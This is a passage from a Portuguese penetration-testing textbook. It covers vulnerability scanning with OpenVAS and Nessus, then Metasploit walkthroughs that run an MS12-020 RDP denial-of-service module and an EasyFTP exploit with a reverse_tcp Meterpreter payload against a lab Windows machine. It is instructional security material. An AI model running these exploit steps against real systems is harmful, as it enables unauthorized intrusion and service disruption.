nde\tum\tusuário\trestrito\tpara\to\tusuário\t\nnt\tauthority\\system\n.\nC:\\\n\twhoami\npc-pc\\restrito\nC:\\\n\tpoc.exe\nC:\\\n\twhoami\nnt\tauthority\\system\n8.1.2\tVulnerabilidade\tremota\nA\tvulnerabilidade\té\texplorada\tde\tmaneira\tremota.\tO\texploit\tnão\tnecessita\tserexecutado\tlocalmente\tna\tmáquina\talvo,\tele\tpode\tser\texecutado\tna\tmáquina\tdo\natacante\te\tremotamente\tconsegue\tacesso\tà\testação.\nPor\texemplo,\to\tusuário\tA\ttem\to\tWindows\tXP\tcom\to\tcompartilhamento\tde\narquivos\tativo.\tExiste\tuma\tvulnerabilidade\tpara\tesse\tserviço\t(MS08_067netapi)\npossibilitando\to\tacesso\tremoto\tà\testação.\n8.2\tScanners\tde\tvulnerabilidade\nO\tscanner\tde\tvulnerabilidade\trealizará\ta\tvarredura\tde\tvulnerabilidades\tremotas.\nHá\tdiversos\tscanners\te\talguns\taté\tespecíficos\tpara\tse\tdeterminar\tfalhas\tsobre\ndeterminado\tserviço,\tcomo\to\twpscan\t(scanner\tpara\to\tWordpress)\te\to\tw3af\n(scanner\tpara\twebsites).\tPorém\tserão\tabordados\tdois\tscanners\tmais\tgenéricos\npara\trealizar\ta\tvarredura:\to\tOpenVAS\te\to\tNessus.\n8.2.1\tOpenVAS\nO\tOpenVAS\té\tuma\tplataforma\tpoderosa\tpara\tanálise\te\tlevantamento\tde\nvulnerabilidades.\tDesenvolvido\tna\tarquitetura\tcliente/servidor,\to\tOpenVAS\npermite\tque\to\tcliente\tfaça\to\tpedido\tao\tservidor\tque\trealiza\to\tescaneamento.\tPor\nmeio\tdo\tOpenVAS\té\tpossível\tdeterminar\tvulnerabilidades\tremotas.\nPrimeiro,\tative\to\tprotocolo\tRDP\tno\tWindows\t7\tclicando\tnas\t\nPropriedades\n\tdo\ncomputador\te\tdepois\tna\taba\t\nRemoto\n,\te\tmarque\ta\topção\t\nPermitir\tligações\tde\ncomputadores\tcom\tqualquer\tversão\tdo\tAmbiente\tde\tTrabalho\t(menos\tseguro)\n(Figuras\t8.2\te\t8.3).\nAté\to\tmomento\tem\tque\teste\tlivro\testava\tsendo\tescrito,\to\tOpenVAS\tencontrava-\nse\tna\tversão\t8\t(beta),\tporém\to\tKali\tLinux\tpor\tpadrão\tpossui\ta\tversão\t7\tinstalada.\nPor\talgum\tmotivo,\to\tOpenVAS\tdo\tKali\tLinux\tnão\tpossui\ttodos\tos\tmódulos\nnecessários\tpara\to\tseu\tcorreto\tfuncionamento\t(como\to\t\nopenvasad\n).\nVamos\tentão\trealizar\to\tdownload\te\tinstalação\tda\tversão\t6\tdo\tOpenVAS\t(um\npouco\tmais\tantiga,\tporém\tmais\testável\tpara\to\tsistema\toperacional\tDebian).\tNo\nsite\toficial\tdo\tOpenVAS\t\nwww.openvas.org\n,\ta\tlista\tde\tdownloads\tpara\tos\tbinários\n(\nhttp://download.opensuse.org/repositories/security:/OpenVAS:/UNSTABLE:/\n)\nencontra-se\tna\tversão\t7\tpara\to\tOpenSUSE\t13.1.\tPara\to\tDebian,\ta\tversão\t6\té\ta\núltima\t(em\tbinário)\tpara\tdownload.\tPorém\tnada\timpede\to\tleitor\tde\ttentar\trealizar\na\tinstalação\tda\tversão\t7\tou\t8\ta\tpartir\tdo\tseu\tcódigo-fonte.Figura\t8.2\t–\tAtivação\tdo\tRDP\tpor\tmeio\tdas\tpropriedades\tdo\tcomputador.\nFigura\t8.3\t–\tPermitindo\to\tambiente\tde\ttrabalho\tremoto\tmenos\tseguro.\nPrimeiro,\tcertifique-se\tde\tque\to\tarquivo\t\n/etc/apt/sources.list\n\tapresenta\tos\ncorretos\tdiretórios\tpara\tdownload\tde\tpacotes\t(\nhttp://docs.kali.org/general-\nuse/kali-linux-sources-list-repositories\n):\ndeb\thttp://old.kali.org/kali\tmoto\tmain\tnon-free\tcontrib\ndeb-src\thttp://old.kali.org/kali\tmoto\tmain\tnon-free\tcontrib\nBaseando-se\tnas\torientações\tfornecidas\tpelo\t\nwww.openvas.org\n,\tpara\trealizar\ta\ninstalação\tda\tversão\t6,\tprimeiro\trealize\tno\tKali\tLinux\tos\tseguintes\nprocedimentos\tpara\tadicionar\to\trepositório\tdo\tOpenVAS\t6:\nroot@kali#\n\techo\t\"deb\nhttp://download.opensuse.org/repositories/security:/OpenVAS:/UNSTABLE:/v6/Debian_7.0/\t./\"\t>>\n/etc/apt/sources.list\nroot@kali#\n\twget\nhttp://download.opensuse.org/repositories/security:/OpenVAS:/UNSTABLE:/v6/Debian_7.0/Release.key\nroot@kali#\n\tapt-key\tadd\t./Release.keyAssim,\to\tbanco\tde\tdados\tdo\tKali\tLinux\testá\tOK,\tatualize-o:\nroot@kali#\n\tapt-get\tupdate\nInstale\tas\tbibliotecas\tresponsáveis\tpelo\tOpenVAS\t6\t(esse\tprocedimento\ndesinstala\to\tOpenVAS\t7):\nroot@kali#\n\tapt-get\tinstall\tlibopenvas6\nOs\tseguintes\tprogramas\tsão\tnecessários:\nroot@kali#\n\tapt-get\t-y\tinstall\tgreenbone-security-assistant\topenvas-cli\topenvas-manager\topenvas-scanner\nopenvas-administrator\tsqlite3\txsltproc\trsync\nInstale\tos\tseguintes\tprogramas\tpara\tgeração\tde\trelatório:\nroot@kali#\n\tapt-get\t-y\tinstall\ttexlive-latex-base\ttexlive-latex-extra\ttexlive-latex-recommended\thtmldoc\nComo\to\tOpenVAS\té\tdestinado\ta\tsistemas\toperacionais\tcomo\to\tCentOS\te\nderivados,\tos\tseguintes\tprogramas\tdevem\tser\tinstalados\tpara\ta\tcorreta\nmanipulação\tdos\tpacotes\tno\tDebian\t(e\tderivados\tcomo\to\tKali\tLinux).\nroot@kali#\n\tapt-get\t-y\tinstall\talien\trpm\tnsis\tfakeroot\nGere\to\tcertificado\tSSL:\nroot@kali#\n\ttest\t-e\t/var/lib/openvas/CA/cacert.pem\t\t||\topenvas-mkcert\t-q\nAtualize\to\tbanco\tde\tdados\tde\tvulnerabilidades:\nroot@kali#\t\nopenvas-nvt-sync\nÉ\tnecessário\tcriar\tum\tcertificado\tpara\to\tusuário\t\nom\n\tdo\tOpenVAS:\nroot@kali#\t\ntest\t-e\t/var/lib/openvas/users/om\t||\topenvas-mkcert-client\t-n\tom\t-i\nAntes\tde\tcontinuarmos,\tos\tserviços\tdo\tOpenVAS\tdevem\tser\tfinalizados:\nroot@kali#\n\t/etc/init.d/openvas-manager\tstop\nroot@kali#\n\t/etc/init.d/openvas-scanner\tstop\nA\tpróxima\tetapa\té\tinicializarmos\to\tserviço\t\nopenvasad\n\tque\tfará\to\tdownload\te\nsincronização\tdas\tvulnerabilidades\tdo\tbanco\tde\tdados\t(essa\tetapa\tpode\tser\nextremamente\tlenta):\nroot@kali#\n\topenvassd\nRefaça\ta\tbase\tde\tdados:\nroot@kali#\t\nopenvasmd\t--rebuild\nÉ\tnecessário\tatualizar\to\tprotocolo\tSCAP\t(essa\tetapa\tpode\tser\textremamentelenta):\nroot@kali#\t\nopenvas-scapdata-sync\nAtualize\ttambém\to\tcertdata:\nroot@kali#\t\nopenvas-certdata-sync\nNa\tprimeira\tvez\tque\tesse\tcomando\té\texecutado,\to\tseguinte\terro\té\tmostrado:\nError:\tno\tsuch\ttable:\tmeta.\nIsso\tocorre\tpelo\tfato\tde\testarmos\timportando\tum\tpacote\tde\tsistemas\tcomo\to\nCentOS,\te\tpelo\tfato\tde\ta\ttabela\t\nmeta\n\tnão\tter\tsido\tcriada\tpelo\tKali\tLinux.\tAssim,\ndevemos\trealizar\to\tdownload\tdas\tdependências\tnecessárias\tpara\tcriação\tda\ntabela\t\nmeta\n.\tNo\tmomento\tem\tque\teste\tlivro\testava\tsendo\tescrito,\tno\trepositório\ndo\t Atomicorp\n(\nhttp://www6.atomicorp.com/channels/atomic/fedora/18/i386/RPMS/\n),\ta\ndependência\t\nopenvas-manager\n,\tencontrava-se\tna\tversão\t5.0.8-27.\tRealize\to\tseu\ndownload.\nroot@kali#\n\tcd\nroot@kali#\n\twget\thttp://www6.atomicorp.com/channels/atomic/fedora/18/i386/RPMS/openvas-manager-\n5.0.8-27.fc18.art.i686.rpm\nExtraia\tos\tarquivos\tdo\tpacote\tRPM:\nroot@kali#\n\trpm2cpio\topenvas-manager-5.0.8-27.fc18.art.i686.rpm\t|\tcpio\t-div\nSerá\tgerada\ta\tpasta\t\n/root/usr/share/openvas/cert/\n.\tCopie\to\tseu\tconteúdo:\nroot@kali#\t\nmkdir\t/usr/share/openvas/cert\nroot@kali#\t\ncp\t/root/usr/share/openvas/cert/*\t/usr/share/openvas/cert\nRefaça\to\tcertdata:\nroot@kali#\t\nopenvas-certdata-sync\nÉ\tnecessário\tcriar\to\tusuário\t\nadmin\n\tcom\tuma\tsenha\tde\tacesso\tpara\to\tOpenVAS:\nroot@kali#\t\ntest\t-e\t/var/lib/openvas/users/admin\t||\topenvasad\t-c\tadd_user\t-n\tadmin\t-r\tAdmin\nOs\tusuários\tcriados\tpodem\tser\tconfirmados\tcom:\nroot@kali#\t\nopenvasad\t-c\tlist_users\nSe\ta\tsenha\tdo\tusuário\t\nadmin\n\tfor\tesquecida,\to\tusuário\t\nadmin\n\tpoderá\tser\tremovido\ne\tcriado\tnovamente:\nroot@kali#\t\nopenvasad\t-c\tremove_user\t-u\tadmin\nroot@kali#\t\ntest\t-e\t/var/lib/openvas/users/admin\t||\topenvasad\t-c\tadd_user\t-n\tadmin\t-r\tAdminÉ\tnecessário\tfinalizar\to\tOpenVAS\t(processo\tantigo):\nroot@kali#\t\nkillall\topenvassd\nO\tque\tvai\tdemorar\tem\ttorno\tde\t15\tsegundos.\tCertifique-se\tde\tque\to\tprocesso\tfoi\nfinalizado:\nroot@kali#\n\tps\taux\t|\tgrep\topenvassd\t|\tgrep\t-v\tgrep\nCaso\tnão\tapareça\tnada\tna\ttela,\tentão\testá\ttudo\tok\te\to\tOpenVAS\tpode\tser\ninicializado:\nroot@kali#\t\n/etc/init.d/openvas-scanner\tstart\nroot@kali#\t\n/etc/init.d/openvas-administrator\trestart\nroot@kali#\t\n/etc/init.d/greenbone-security-assistant\trestart\nroot@kali#\n\t/etc/init.d/openvas-manager\tstart\n\t\nNota:\n\tàs\tvezes\to\topenvas-manager\tnão\tinicia,\tmostrando\tuma\tmensagem\tde\terro.\tReinicie\ttodos\tos\nserviços\tdo\tOpenVAS\tpara\tsolucionar\to\tproblema.\n\t\nPelo\tnavegador,\tacesse\to\tendereço\t\nhttps://localhost:9392/\n;\tinstale\tos\tcertificados\ndigitais\te\tinicie\to\tOpenVAS\tcom\to\tusuário\t\nadmin\n\te\ta\tsua\trespectiva\tsenha.\nApós\tter\tlogado\tno\tsistema,\ta\ttela\tinicial\tdo\tOpenVAS\té\tmostrada\tna\tfigura\t8.4.\nFigura\t8.4\t–\tTela\tinicial\tdo\tOpenVAS.\nPara\trealizar\tum\tescaneamento\tsimples,\tdigite\to\tIP\tdo\talvo\te\tdepois\tclique\tno\nbotão\t\nStart\tScan\t\n(Figura\t8.5).Figura\t8.5\t–\tVarrendo\to\tWindows.\nNo\tbotão\tde\tlupa,\tdetalhes\tsobre\ta\tvarredura\tsão\texibidos\t(Figura\t8.6).\nFigura\t8.6\t–\tDetalhes\tda\tvarredura.\nEnquanto\ta\tvarredura\té\trealizada,\tmais\tdetalhes\tsobre\tas\tvulnerabilidades\tdo\nalvo\tpodem\tser\tobtidos\tno\tbotão\tde\tlupa\t(Figura\t8.7).Figura\t8.7\t–\tDetalhes\tsobre\tas\tvulnerabilidades.\nO\tOpenVAS\tnão\tatualiza\to\tstatus\tdo\t\nscanning\n,\tfaça-o\tmanualmente\t(Figura\t8.8).\nNo\tfinal,\tum\trelatório\tPDF\tpode\tser\tgerado\tpelo\tOpenVAS\t(Figura\t8.9).\nA\topção\t\nScan\tManagement\t>\tTasks\n\tmostra\ttodos\tos\t\nscans\n\tem\tprogresso\te\tque\tjá\nforam\trealizados\t(Figura\t8.10).\nFigura\t8.8\t–\tAtualizando\to\tscanning.\nFigura\t8.9\t–\tGerando\tum\trelatório\tdo\tOpenVAS.Figura\t8.10\t–\tTarefas\t(scan)\tem\texecução\te/ou\texecutadas.\nPara\trealizar\tum\tscan\tmais\tdetalhado\t(um\tteste\tmais\tdemorado\tporém\tmais\nprofundo),\tvá\tpara\ta\topção\t\nConfiguration\t>\tTargets\n\t(Figura\t8.11).\nFigura\t8.11\t–\tRealizando\tum\tscan\tmais\tdetalhado.\nVão\taparecer\tos\talvos\tque\tjá\tforam\tescaneados,\tcrie\tum\tnovo\talvo\tno\tbotão\tde\nestrela\t(Figura\t8.12).\nFigura\t8.12\t–\tCriando\tum\tnovo\talvo.\nInsira\tas\tinformações\tnecessárias\tsobre\to\tseu\talvo,\tcomo\tum\tnome\tde\nidentificação\te\to\tseu\tendereço\tIP\t(Figura\t8.13).Figura\t8.13\t–\tInserindo\tas\tinformações\tdo\tnovo\talvo.\nUma\tvez\tcom\ta\tconfiguração\tdo\tscan\tok,\tcrie-o\tpela\topção\t\nScan\tManagement\t>\nNew\tTask\n\t(Figura\t8.14).\nFigura\t8.14\t–\tCriando\tuma\tnova\ttarefa\t(scan).\nInsira\tas\tinformações\tdo\tDebian:\tEm\t\nName\n,\tdefina\to\tnome\tdo\tscan.\tEm\t\nScan\nConfig\n,\n\t\nselecione\to\tmodo\tque\tserá\trealizado\to\tscan\t(extremamente\trápido,\nporém\tpouco\tdetalhado;\tnormal;\textremamente\tlento,\tporém\tbem\tdetalhado\tetc).\nEm\t\nScan\tTargets\n,\tselecione\to\tprofile\tcorrespondente\tao\tnovo\tscanning\t(Figura\n8.15).Figura\t8.15\t–\tSelecionando\tcorretamente\to\tnovo\talvo\ta\tser\tescaneado.\nPor\túltimo,\to\tscanning\tfoi\tcriado,\tpodendo\tser\tinicializado\tno\tbotão\tde\tPlay\n(Figura\t8.16).\nFigura\t8.16\t–\tInicilizando\to\tnovo\tscanning.\n8.2.2\tNessus\nO\tNessus\té\tum\texcelente\tscanner\tde\tvulnerabilidade.\tApresenta\tversões\tHome\te\nEnterprise.\tDiferentemente\tdo\tOpenVAS,\ttem\tversões\tpagas\te\tgratuitas,\tsendo\nHome\ta\tversão\tgratuita.\n•\tRealize\to\tdownload\tdo\tNessus\tem\nhttp://www.tenable.com/products/nessus/select-your-operating-system.\n•\tInstale\to\tNessus:\nroot@kali#\t\ncd\t/root/Downloads\nroot@kali#\t\ndpkg\t–i\tNessus-6.3.3-debian6_i386.deb\n•\tInicie\to\tservidor\tNessus:\nroot@kali#\n\t/etc/init.d/nessusd\tstart\n•\tAcesse\to\tNessus\tno\tnavegador:\nhttps://127.0.0.1:8834/https://127.0.0.1:8834/\nNa\tprimeira\tinstalação,\tcrie\tum\tusuário\tque\tfará\to\tacesso\tao\tNessus\t(Figura\n8.17).\nNa\tprimeira\tinstalação,\tserá\tpedido\to\tcódigo\tde\tregistro\tdo\tNessus\n(\nhttp://www.tenable.com/products/nessus/nessus-plugins/obtain-an-activation-\ncode\n).\tFaça\ttodo\to\tregistro\tconforme\té\tinstruído\tpelo\tpróprio\tNessus.\nFigura\t8.17\t–\tCriando\tum\tusuário\tpara\to\tNessus.\nCom\to\tNessus\tinstalado,\tatualize\tos\tplugins:\nroot@kali#\t\n/opt/nessus/sbin/nessuscli\tupdate\t--all\nAo\tser\tiniciado,\tinsira\to\tnome\tde\tusuário\te\tsenhas\tque\tforam\tcriados\tpara\nacessar\to\tNessus\t(Figura\t8.18).\nFigura\t8.18\t–\tInserindo\tos\tdados\tno\tNessus.\nPara\trealizar\tum\tscan,\tselecione\ta\taba\t\nScan\t>\tNew\tScan\n\t(Figura\t8.19).Figura\t8.19\t–\tCriando\tum\tnovo\tscan.\nO\tNessus\ttem\tdiversos\ttipos\tde\tpolítica,\tcomo\tscanner\tbásico\tde\tredes,\tdetecção\nde\tmalware\tpara\tWindows,\tscan\tsobre\ta\tvulnerabilidade\tShellshock\te\toutros.\nSerá\trealizado\to\tscan\tbásico\t(Figura\t8.20).\nFigura\t8.20\t–\tSelecione\to\tscan\tbásico\tde\tvulnerabilidades\t(Basic\tNetwork\nScan).\nDefina\to\tnome\tdo\tscan,\tfaça\tuma\tpequena\tdescrição\te\tinforme\to\tIP\ta\tser\ttestado,\nconforme\tmostra\ta\tfigura\t8.21.\nFigura\t8.21\t–\tParâmetros\tbásicos\tpara\ta\tcriação\tda\tpolítica.\nO\tscan\tjá\té\tiniciado\t(Figura\t8.22).Figura\t8.22\t–\tScanning\tsendo\trealizado.\nNo\ttérmino\tdo\tscan,\tum\tarquivo\tPDF\tpode\tser\texportado\t(Figura\t8.23).\nFigura\t8.23\t–\tGerando\tum\tarquivo\tPDF.CAPÍTULO\n\t9\nExploração\tdo\talvo\nUma\tvez\trealizadas\tas\tetapas\tde\tcoleta\tde\tinformações,\tdescobertas\tnos\ncomputadores\te\tversões\tdos\tserviços\tque\testão\trodando,\te\tfeito\to\tmapeamento\nde\tvulnerabilidades,\to\tpróximo\tpasso\té\ta\texploração\tdo\talvo.\nA\texploração\tdo\talvo\té\to\tato\tde\t“invadir”\ta\tmáquina\tcom\texploits\t(programas\nque\texploram\tfalhas\tem\toutros\tprogramas);\tutilizando\to\texploit\tcorreto,\to\tacesso\nao\tterminal\tde\tcomandos\tdo\tsistema\t(shell)\té\tfornecido\tao\tatacante.\nA\texploração\tocorre\tde\tduas\tformas:\tpela\tengenharia\tsocial\t(o\tsistema\tnão\nprecisa\tter\tvulnerabilidades\tpara\tconseguirmos\to\tacesso)\tou\tpor\tfalhas\tde\nsoftwares\t(o\tsistema\tutiliza\tuma\tversão\tantiga\tou\tvulnerável\tde\tsoftware\tque\npermite\to\tacesso\tao\tshell\tdo\tsistema).\nA\tescrita\tde\texploits\té\tuma\ttarefa\tque\trequer\tmuito\ttempo,\tdetalhe\te\nconhecimento\tprofundo\tsobre\tsistemas\toperacionais\te\tlinguagens\tde\nprogramação,\tfugindo\ttotalmente\tdo\tescopo\tdo\tlivro.\tEm\tvez\tdisso,\tutilizaremos\nexploits\tpúblicos,\tque\tjá\tforam\tdescobertos\te\tdivulgados\t(sua\tutilização\tcostuma\nser\tsimples).\tNormalmente\tjá\texistem\tcorreções\tpara\tesses\texploits,\tmas\tmesmo\nassim\to\tsistema\tauditado\tpode\testar\tdesatualizado\te\tvulnerável.\nEsses\texploits\tficaram\tespalhados\tna\trede\tpor\tmuitos\tanos,\tnecessitando\t“ciscar”\na\tinternet\tpara\tencontrá-los\tem\talgum\tsite\t(diga-se\tde\tpassagem\tcom\torigem\nmuito\tduvidosa).\tHoje,\tbuscar\texploits\ttornou-se\tuma\ttarefa\tbem\tmais\tfácil,\tpois\neles\tencontram-se\tem\trepositórios\tespecíficos\t(de\torigem\tconfiável).\nÉ\timportante\tnotar\tque\tnem\ttoda\tfalha\tdescoberta\ttem\to\texploit\tfeito\tou\tliberado\nao\tpúblico.\tMuitas\tfalhas\tsão\tlançadas\tsem\to\tseu\texploit\tou\tsão\tlançadas\tversões\ncomerciais\te\tpagas\tda\tcópia\tdesses\texploits.\tA\tempresa\tVUPEN\n(\nhttp://www.vupen.com\n)\té\tum\texemplo\tde\tuma\tempresa\tcomercial\tque\ttem\nexploits\tpagos.\nPrincipais\trepositórios\tde\texploits:\n•\t\nhttp://packetstormsecurity.com/\n•\t\nhttp://www.exploit-db.com/•\t\nhttp://osvdb.org/\n•\t\nhttp://www.1337day.com/\n•\t\nhttp://www.securityfocus.com/\n•\t\nhttp://www.securiteam.com/\n•\t\nhttp://www.intelligentexploit.com/\n•\t\nhttp://www.vupen.com/english/\n•\t\nhttp://www.kb.cert.org/vuls\n9.1\tMetasploit\nFerramenta\tdesenvolvida\tpelo\thacker\tHD\tMoore;\tcom\tcerteza\té\tuma\tdas\nmelhores\topções\tquando\to\tassunto\té\to\tdesenvolvimento\te\tutilização\tde\texploits.\nA\tarquitetura\tdo\tMetasploit\té\tdivida\tem\ttrês\tcategorias:\tbibliotecas,\tinterfaces\te\nmódulos.\tAs\tinterfaces\t(console,\tGUI\te\tweb)\tfornecem\tum\tmeio\tde\tinteragirmos\ncom\tos\tseus\tmódulos\t(Exploit,\tpayload,\tauxiliares,\tencoders\tetc.).\nAlguns\tconceitos\tbásicos\tsobre\tos\tmódulos\tdo\tMetasploit\tdevem\tser\tentendidos.\n•\t\nExploit\n\t–\tÉ\ta\tprova\tde\tconceito\tde\tque\ta\tvulnerabilidade\texiste.\tCom\tele\té\npossível\texplorar\ta\tvulnerabilidade\tno\tsoftware\tafetado,\tganhando\tacesso\nantes\tnão\tpermitido.\n•\t\nPayload\n\t–\tÉ\tum\tcódigo\tmalicioso\tque\tfaz\tparte\tdo\texploit\t(ou\tcompilado\nindependentemente)\tque\texecuta\tcomandos\tarbitrários\tno\tsistema\talvo.\tO\npayload\testabelece\tum\tcanal\tde\tcomunicação\tentre\to\tatacante\te\to\talvo.\tCom\no\tpayload\té\tpossível,\tpor\texemplo,\tobter\to\tcontrole\tda\tShell\tdo\tsistema.\n•\t\nShellcode\n\t–\tÉ\tum\tcódigo\tmalicioso\tque\tfaz\tparte\tdo\texploit\tque\ttem\tcomo\nmissão\tinjetar\tcódigos\tno\tsistema\talvo,\tcausando,\tdessa\tforma,\to\tbuffer\noverflow\tou\testouro\tde\tpilha.\tNormalmente\to\tshellcode\tvem\tacompanhado\ndo\tpayload.\tPois\tuma\tvez\tque\to\tbuffer\toverflow\tseja\tfeito\tpor\tmeio\tdo\nshellcode,\tserá\tnecessária\ta\tinjeção\tde\tum\tcódigo\tmalicioso\tque\tpermita,\tpor\nexemplo,\tobter\to\tcontrole\tdo\tshell\tdo\tsistema.\tO\tshellcode\té\to\tque\tde\tfato\nexplora\ta\tvulnerabilidade.\n•\t\nMódulos\tauxiliares\t\n–\tConjunto\tde\tferramentas\tque\tforam\tdesenvolvidas\npara\ttarefas\tauxiliares\tna\texploração\tdo\tsistema\talvo.\tPor\texemplo:\tport\nscanner,\tsniffing,\tferramentas\tde\tnegação\tde\tserviço\tetc.•\t\nEncoders\n\t–\tFerramentas\tque\tforam\tdesenvolvidas\tcom\to\tintuito\tde\tburlar\nsistemas\tde\tantivírus,\tfirewall,\tIDS,\tou\tferramentas\tanti-malware.\nHá\tdiversas\tinterfaces\tpara\to\tuso\tdo\tMetasploit,\tcomo\to\tMsfconsole,\tMsfcli,\nArmitage\te\toutros.\tPorém\tvamos\tnos\tdeter\tao\tMsfconsole,\tuma\tinterface\tsimples\nem\tlinha\tde\tcomando\tque\tnão\tdeixa\tnada\ta\tdesejar.\n9.1.1\tMsfconsole\nO\tMsfconsole\té\ta\tmais\tpopular\tdentre\tas\tinterfaces\tdo\tMetasploit\tpara\tutilizar.\tE\nserá\to\tfoco\tdo\tlivro\ttratar\tapenas\tdessa\tinterface,\tdevido\tà\tsua\tsimplicidade\te\n“poder\tde\tfogo”.\tPara\tcomeçar\ta\tutilização\tdo\tMetasploit,\tinicie\to\tservidor\tde\nbanco\tde\tdados\tPostgreSQL\t(necessário,\tpois\ta\tbusca\tpor\texploits\tno\tbanco\tde\ndados\tserá\tmais\tágil).\nroot@kali#\t\nservice\tpostgresql\tstart\nInicie\to\tMsfconfole:\nroot@kali#\n\tmsfconsole\nAtualize\tsempre\ta\tbase\tde\tdados\tde\texploits\tdo\tMetasploit:\nroot@kali#\t\nmsfupdate\n9.1.2\tComandos\tbásicos\nUma\tvez\tinicializada\ta\tinterface\tdo\tMetasploit,\to\tcomando\t\nhelp\n\texibe\tuma\ttela\nde\tajuda\tsobre\tquais\tcomandos\tpodem\tser\tdigitados.\nmsf\n\t>\thelp\nCaso\tnecessite\tprocurar\talgum\texploit,\tdigite\t\nsearch\texploit\n:\nmsf\n\t>\tsearch\tms12_020\nMatching\tModules\n================\n\t\t\tName\t\tDisclosure\tDate\t\tRank\t\t\t\tDescription\n\t\t\t----\t\t---------------\t\t----\t\t\t\t-----------\nauxiliary/dos/windows/rdp/ms12_020_maxchannelids\t2012-03-16\tnormal\tMS12-020\tMicrosoft\tRemote\nDesktop\tUse-After-Free\tDoS\nauxiliary/scanner/rdp/ms12_020_check\n\tnormal\tMS12-020\tMicrosoft\tRemote\tDesktop\tChecker\nmsf\n\t>\nPara\tutilizar\to\texploit,\tdigite\t\nuse\texploit\n;\tvamos\tentão\tutilizar\to\texploit\nauxiliary/dos/windows/rdp/ms12_020_maxchannelids\n:msf\n\t>\tuse\tauxiliary/dos/windows/rdp/ms12_020_maxchannelids\nmsf\n\tauxiliary(ms12_020_maxchannelids)\t>\nA\tinterface\tdo\tMetasploit\tfoi\talterada\tde\t\nmsf\t>\n\tpara\t\nmsf\nauxilary(ms12_020_\nmaxchannelids\n)\t>\n,\tindicando\tque\testamos\tusando\to\texploit\nms12_020_maxchannelids\n.\n9.2\tA\tvulnerabilidade\tMS12-020-maxchannelids\nAntes\tde\tfato\texplorar\ta\tvulnerabilidade\tdo\tEasyFTP\t(vulnerabilidade\tque\tdará\nacesso\tao\tsistema),\tserá\tutilizado\tum\tmódulo\tauxiliar\tdo\tMetasploit\tpara\nnegação\tde\tserviço.\tOu\tseja,\ta\tmáquina\tserá\t“paralisada”.\nO\tprotocolo\tRDP\tdo\tWindows\t7\tsofre\tde\tuma\tvulnerabilidade\tque\tquando\nenviado\to\tshellcode\tcorreto,\ta\tmáquina\ttrava\to\tseu\tfuncionamento,\te\té\tforçada\ta\nsua\treinicialização,\tgerando\ta\tnegação\tde\tserviço.\nPara\texplorar\ta\tfalha\t\nms12_020_maxchannelids\n,\to\tleitor\tdeve\tconfigurar\to\tRDP\ndo\tWindows.\tMais\tinformações\tsobre\ta\tconfiguração\tdo\tRDP\tpodem\tser\tobtidas\nno\ttópico\t8.2.1,\t“OpenVAS”.\nUma\tvez\tfeito\to\tlevantamento\tdas\tvulnerabilidades\tno\tWindows\t7,\to\tOpenVAS\nnos\tinforma\tque\ta\tporta\t3389\t(RDP)\testá\taberta,\te\tque\testá\trodando\tum\tserviço\nvulnerável.\tA\tvulnerabilidade\tfoi\tinformada\tpela\tMicrosoft\tcomo\tsendo\tMS12-\n020.\nUma\tvez\tselecionado\to\texploit\tcom\tos\tpassos\tanteriores,\tvamos\tver\tas\ninformações\tdele:\nmsf\n\tauxiliary(ms12_020_maxchannelids)\t>\tinfo\nVamos\tver\tas\tsuas\topções\tbásicas\tde\tconfiguração:\nmsf\n\tauxiliary(ms12_020_maxchannelids)\t>\tshow\toptions\nModule\toptions\t(auxiliary/dos/windows/rdp/ms12_020_maxchannelids):\nName\tCurrent\tSetting\t\nRequired\n\tDescription\n----\t---------------\t--------\t-----------\nRHOST\t\t\t\t\t\t\tyes\n\tThe\ttarget\taddress\nRPORT\t\t3389\tyes\tThe\ttarget\tport\nmsf\n\tauxiliary(ms12_020_maxchannelids)\t>\nAs\topções\tmarcadas\tcomo\trequeridas\t(campo\tRequired\tyes)\tsão\tobrigatórias\npara\ta\tconfiguração\tdo\texploit\n.\n\tPara\tesse\texploit\tespecífico,\tsomente\to\tcampoRHOST\tdeve\tser\tmarcado\t(o\tcampo\tRPORT\ttambém,\tmas\to\tMetasploit\tjá\tpré-\nconfigurou\to\texploit\tpara\tque\tatue\tna\tporta\t3389\t–\tporta\tpadrão\tdo\tRDP).\n•\tVamos\tconfigurar\to\texploit:\nmsf\n\tauxiliary(ms12_020_maxchannelids)\t>\tset\tRHOST\t192.168.1.101\n•\tVamos\tver\tas\tsuas\topções\tavançadas:\nmsf\n\tauxiliary(ms12_020_maxchannelids)\t>\tshow\tadvanced\n•\tVamos\tutilizar\to\texploit:\nmsf\n\tauxiliary(ms12_020_maxchannelids)\t>\texploit\nE,\tna\tmáquina\tWindows,\to\texploit\tcausará\ta\tfamosa\t“Tela\tazul\tda\tmorte”.\n9.3\tExploitando\tWindows\tvulnerável\nA\tvulnerabilidade\tencontrada\ttrata-se\tde\tuma\tvulnerabilidade\tno\tEasyFTP\nversão\t1.7.0.11\tque\tpermite\tacesso\tao\tshell\tda\tmáquina.\tO\tEasyFTP\tv1.7.0.11\npode\tser\tencontrado\tem\t\nhttp://www.exploit-db.com/wp-\ncontent/themes/exploit/applications/16e5d2d9e9e55dcd5b7ec4c2811ca193-\neasyftp-server-1.7.0.11-en.zip\n•\tVamos\tprocurar\ta\tfalha:\nmsf\n\t>\tsearch\teasyftp\n•\tVamos\tusar\to\texploit:\nmsf\n\t>\tuse\texploit/windows/ftp/easyftp_cwd_fixret\n•\tVamos\tver\tas\tsuas\topções\tbásicas\tde\tconfiguração:\nmsf\n\texploit(easyftp_cwd_fixret)\t>\tshow\toptions\n•\tVamos\tconfigurar\to\thost\tremoto:\nmsf\n\texploit(easyftp_cwd_fixret)\t>\tset\tRHOST\t192.168.1.101\nEsse\texploit\trequer\talgumas\tconfigurações\tadicionais.\nPrimeiro\tdevemos\tescolher\to\tpayload,\tou\tseja,\to\tcódigo\tresponsável\tpor\tfazer\ta\nconexão\treversa\tentre\ta\tmáquina\tdo\tatacante\te\ta\tmáquina\tda\tvítima.\nHá\tdiversos\tpayloads\tdisponíveis,\tmas\tserá\tutilizado\tum\tpayload\tem\tparticular\ndenominado\tMeterpreter,\tque\tpermite\tfuncionalidades\ta\tmais\tno\tsistema,\tcomo\ncaptura\tde\tteclas\tdigitadas,\tdownload\te\tupload\tde\tarquivos\tetc.\tPara\tmaisinformações\tsobre\to\tMeterpreter,\tconsulte\ta\tseção9.4,\t“Payload\tMeterpreter”.\nmsf\n\texploit(easyftp_cwd_fixret)\t>\tset\tPAYLOAD\twindows/meterpreter/reverse_tcp\nQuando\tas\tconfigurações\tbásicas\tforem\texibidas\tnovamente,\thaverá\talguns\nparâmetros\tadicio